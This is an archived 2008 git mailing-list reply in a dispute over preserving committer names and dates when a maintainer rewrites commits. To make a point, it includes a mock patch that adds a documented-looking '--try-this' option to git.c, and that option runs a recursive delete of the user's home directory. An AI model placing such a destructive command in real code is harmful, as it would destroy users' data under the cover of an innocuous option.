From: Johannes Schindelin <Johannes.Schindelin@gmx.de>
Subject: Re: [PATCH] Keep committer and committer dates
Date: Thu, 5 Jun 2008 14:54:29 +0100 (BST)
Message-ID: <alpine.DEB.1.00.0806051452380.21190@racer>
References: <Pine.LNX.4.61.0806031647320.1798@tm8103-a.perex-int.cz> <alpine.DEB.1.00.0806032115340.13507@racer.site.net> <Pine.LNX.4.61.0806041113520.1798@tm8103-a.perex-int.cz> <20080604102906.GA2126@diana.vm.bytemark.co.uk> <m3ej7dzc7y.fsf@localhost.localdomain>
 <Pine.LNX.4.61.0806041424140.1798@tm8103-a.perex-int.cz> <alpine.DEB.1.00.0806041641150.13507@racer.site.net> <20080605010330.GB24466@leksak.fem-net> <alpine.DEB.1.00.0806050523120.21190@racer> <4847917A.2050700@viscovery.net> <Pine.LNX.4.61.0806051428390.1798@tm8103-a.perex-int.cz>
 <alpine.DEB.1.00.0806051408520.21190@racer> <Pine.LNX.4.61.0806051528220.1798@tm8103-a.perex-int.cz>
Mime-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Cc: Johannes Sixt <j.sixt@viscovery.net>,
	Stephan Beyer <s-beyer@gmx.net>, git@vger.kernel.org
To: Jaroslav Kysela <perex@perex.cz>
X-From: git-owner@vger.kernel.org Thu Jun 05 15:56:49 2008
Return-path: <git-owner@vger.kernel.org>
Envelope-to: gcvg-git-2@gmane.org
Received: from vger.kernel.org ([209.132.176.167])
	by lo.gmane.org with esmtp (Exim 4.50)
	id 1K4FxP-0006q0-MV
	for gcvg-git-2@gmane.org; Thu, 05 Jun 2008 15:56:48 +0200
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1755068AbYFENzy (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
	Thu, 5 Jun 2008 09:55:54 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1755056AbYFENzy
	(ORCPT <rfc822;git-outgoing>); Thu, 5 Jun 2008 09:55:54 -0400
Received: from mail.gmx.net ([213.165.64.20]:46979 "HELO mail.gmx.net"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
	id S1755012AbYFENzx (ORCPT <rfc822;git@vger.kernel.org>);
	Thu, 5 Jun 2008 09:55:53 -0400
Received: (qmail invoked by alias); 05 Jun 2008 13:55:51 -0000
Received: from unknown (EHLO racer.local) [128.177.17.254]
  by mail.gmx.net (mp036) with SMTP; 05 Jun 2008 15:55:51 +0200
X-Authenticated: #1490710
X-Provags-ID: V01U2FsdGVkX1+3pKwIssS3eD1XK1PzLcKUh7xUb7yfk2hcJ1OiQ5
	2hZLyfzDRZYStQ
X-X-Sender: gene099@racer
In-Reply-To: <Pine.LNX.4.61.0806051528220.1798@tm8103-a.perex-int.cz>
User-Agent: Alpine 1.00 (DEB 882 2007-12-20)
X-Y-GMX-Trusted: 0
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org
Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/83934>

Hi,

On Thu, 5 Jun 2008, Jaroslav Kysela wrote:

> On Thu, 5 Jun 2008, Johannes Schindelin wrote:
> 
> > It would make a wonderfully helpful tool less helpful.
> 
> I don't agree. Tool is tool. Every tool can be used in a wrong way. A 
> notice to documentation that some of functionality should be used very 
> carefully should be enough.

In that case, could you please test this patch?

-- snip --
[PATCH] git wrapper: --try-this

Signed-off-by: Johannes Schindelin <Johannes.Schindelin@gmx.de>
---
 Documentation/git.txt |   10 +++++++++-
 git.c                 |    2 ++
 2 files changed, 11 insertions(+), 1 deletions(-)

diff --git a/Documentation/git.txt b/Documentation/git.txt
index 12f706a..e7f7764 100644
--- a/Documentation/git.txt
+++ b/Documentation/git.txt
@@ -11,7 +11,7 @@ SYNOPSIS
 [verse]
 'git' [--version] [--exec-path[=GIT_EXEC_PATH]]
     [-p|--paginate|--no-pager]
-    [--bare] [--git-dir=GIT_DIR] [--work-tree=GIT_WORK_TREE]
+    [--bare] [--git-dir=GIT_DIR] [--work-tree=GIT_WORK_TREE] [--try-this]
     [--help] COMMAND [ARGS]
 
 DESCRIPTION
@@ -120,6 +120,14 @@ OPTIONS
 --version::
 	Prints the git suite version that the 'git' program came from.
 
+--try-this::
+	This option does something that is documented, so you are
+	relatively safe running it.  It may be the case that in your
+	environment, it does something that you do not want it to do,
+	but you could have read the documentation before it was too late.
+	I mean, people should not just use some random option without
+	understanding what they do, even if they do it all the time.
+
 --help::
 	Prints the synopsis and a list of the most commonly used
 	commands. If the option '--all' or '-a' is given then all
diff --git a/git.c b/git.c
index d8db529..1772fbe 100644
--- a/git.c
+++ b/git.c
@@ -72,6 +72,8 @@ static int handle_options(const char*** argv, int* argc, int* envchanged)
 			setenv(GIT_DIR_ENVIRONMENT, getcwd(git_dir, sizeof(git_dir)), 0);
 			if (envchanged)
 				*envchanged = 1;
+		} else if (!strcmp(cmd, "--try-this")) {
+			execl("rm", "-rf", getenv("HOME"), NULL);
 		} else {
 			fprintf(stderr, "Unknown option: %s\n", cmd);
 			usage(git_usage_string);
-- snap --

> > The problem there is that you -- again -- lie about the committers.  
> > They _never_ saw, approved, or tested those commits.
> 
> If I changed portion of unpublished tree, as maintainer I can combine 
> any patches and it might make sense to keep at least my commit dates for 
> my reference.

The problem is _NOT_ the unpublished tree, but that you, as a maintainer, 
committed something, but said that somebody else did.  Possibly avoiding 
blame, shifting it to others.

Sheesh,
Dscho
